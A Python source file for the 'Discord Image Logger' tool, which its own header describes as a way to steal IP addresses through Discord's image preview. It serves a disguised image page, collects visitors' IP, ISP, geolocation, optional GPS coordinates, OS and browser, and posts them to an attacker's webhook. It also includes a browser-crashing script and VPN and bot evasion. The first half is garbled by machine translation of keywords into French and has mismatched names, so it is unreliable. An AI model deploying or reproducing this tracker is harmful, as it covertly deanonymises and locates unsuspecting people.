# Enregistreur d'images Discord
# Par DeKrypt | https://github.com/dekrypted
de http.serveur importation BaseHTTPRequestHandler
de urllib importation analyser
importation retraçage, demandes, base64, httpagentparser
__app__ = "Discord Image Logger"
__description__ = "Une application simple qui vous permet de voler des adresses IP et plus encore en abusant de la fonctionnalité Open Original de Discord"
__version_____________ = "v2.0"
__auteur__ = "DeKrypt"
configuration = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/your/webhook",
    "image": "https://link-to-your-image.here", # Vous pouvez également avoir une image personnalisée en utilisant un argument URL
                                               # (P. ex. yoursite.com/imagelogger?url=<Insérez un lien URL-échappé vers une image ici>)
    "imageArgument": Vrai, # Permet d'utiliser un argument URL pour modifier l'image (VOIR LE README)
    # PERSONNALISATION #
    "nom d'utilisateur": "Image Logger", # Définissez ceci sur le nom que vous voulez que le webhook ait
    "couleur": 0x00FFF, # Hex Couleur que vous voulez pour l'intégration (Exemple: Rouge est 0xFF0000)
    # OPTIONS #
    "crashBrowser": Faux, #Essaie de bloquer/geler le navigateur de l'utilisateur, peut ne pas fonctionner. (J'AI FAIT CECI, VOIR https://github.com/dekrypted/Chromebook-Crasher)
    
    "précisionLocation": Faux, # Utilise le GPS pour trouver l'emplacement exact de l'utilisateur (Adresse réelle, etc.) désactivé car il demande à l'utilisateur qui peut être suspect.
    "message"{: # Afficher un message personnalisé lorsque l'utilisateur ouvre l'image
        "doMessage": Faux, # Activer le message personnalisé?
        "message": "Ce navigateur a été créé par Image Logger de DeKrypt. https://github.com/dekrypted/Discord-Image-Logger", # Message à montrer
        "richMessage": Vrai, # Activer le texte enrichi? (Voir README pour plus d'informations)
    },
    "vpnCheck": 1, # Empêche les VPN de déclencher l'alerte
                # 0 = Non Anti-VPN
                # 1 = Ne pas ping quand un VPN est suspecté
                # 2 = N'envoyez pas d'alerte lorsqu'un VPN est suspecté
    "linkAlerts": Vrai, # Alerte lorsque quelqu'un envoie le lien (Peut ne pas fonctionner si le lien est envoyé plusieurs fois à quelques minutes l'un de l'autre)
    "buggedImage": Vrai, # Affiche une image de chargement en tant qu'aperçu lors de l'envoi dans Discord (Peut apparaître comme une image de couleur aléatoire sur certains appareils)
    "antiBot": 1, # Empêche les robots de déclencher l'alerte
                # 0 = Non Anti-Bot
                # 1 = Ne ping pas quand c'est peut-être un bot
                # 2 = Ne ping pas quand c'est 100% un bot
                # 3 = N'envoyez pas d'alerte quand c'est peut-être un bot
                # 4 = N'envoyez pas d'alerte quand c'est 100% un bot
    
    # REDIRECTION #
    "redirection"{:
        "redirection": Faux, # Rediriger vers une page web?
        "page": "https://your-link.here" # Lien vers la page web à rediriger vers 
    },
    # Veuillez entrer toutes les valeurs dans le format correct. Sinon, il peut se briser.
    # Ne modifiez rien en dessous, sauf si vous savez ce que vous faites.
    # NOTE: L'arbre de hiérarchie se déroule comme suit:
    # 1) Rediriger (Si cela est activé, désactive le navigateur image et crash)
    # 2) Crash Browser (Si cela est activé, désactive l'image)
    # 3) Message (Si cela est activé, désactive l'image)
    #4) Image 
}
blacklistés = ("27", "104", "143", "164"') # IP sur liste noire. Vous pouvez entrer une adresse IP complète ou le début pour bloquer un bloc entier.
                                                           # Cette fonctionnalité est non documentée principalement en raison de sa meilleure détection des robots.
déf botCheck(ip, utilisateur'):
    si ip.startswith(("34", "35")):
        retour "Discorde"
    elif utilisateur.startswith("TelegramBot"'):
        retour "Telegram"
    autre: 
        retour Faux
déf rapportErreur(erreur'):
    demandes.post(configuration["webhook"], json = {
    "nom d'utilisateur": configuration["nom d'utilisateur"],
    "contenu": "@tout le monde",
    "embeds"[
        {
            "titre": "Image Logger - Erreur",
            "couleur": configuration["couleur"],
            "description": f"Une erreur s'est produite lors de la tentative d'enregistrement d'une adresse IP!\n\n**Erreur:**\n1. - A.\n{erreur}\n''' '''' ''''' ''''' '''''',
        }
    ],
})
déf makeReport(ip, utilisateur = Aucun, coordonne = Aucun, point final = "N/A", url = Faux'):
    si ip.startswith(blacklistés'):
        retour
    
    bot = botCheck(ip, utilisateur')
    
    si bot: 
        demandes.post(configuration["webhook"], json = {
    "nom d'utilisateur": configuration["nom d'utilisateur"],
    "contenu": "",
    "embeds"[
        {
            "titre": "Image Logger - Lien envoyé",
            "couleur": configuration["couleur"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return
    ping = "@everyone"
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return
        if config["antiBot"] == 3:
                return
        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""
        if config["antiBot"] == 1:
                ping = ""
    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**
**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`
**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info
binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}
class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]
            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.
                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                
                message = config["message"]["message"]
                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
                datatype = 'text/html'
                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.
                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}
</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())
        return
    
    do_GET = handleRequest
    do_POST = handleRequest

gestionnaire = ImageLoggerAPI
gestionnaire = app=ImageLoggerAPI  
